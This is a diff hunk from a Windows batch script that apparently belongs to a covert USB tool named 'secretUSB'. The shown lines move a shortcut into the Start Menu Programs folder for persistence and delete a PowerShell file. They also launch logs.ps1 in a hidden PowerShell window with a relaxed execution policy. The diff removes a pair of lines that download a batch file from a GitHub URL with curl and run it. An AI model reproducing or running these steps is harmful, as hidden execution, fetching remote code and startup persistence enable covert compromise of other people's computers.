@@ -98,9 +98,6 @@ move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Pro
 
 del C:\System_logs\raccourci.ps1
 
-curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/hostname.bat
-start "" cmd /c "hostname.bat"
-
 Powershell.exe -NoLogo -WindowStyle Hidden -executionpolicy remotesigned -File  c:\System_logs\logs.ps1
 
 
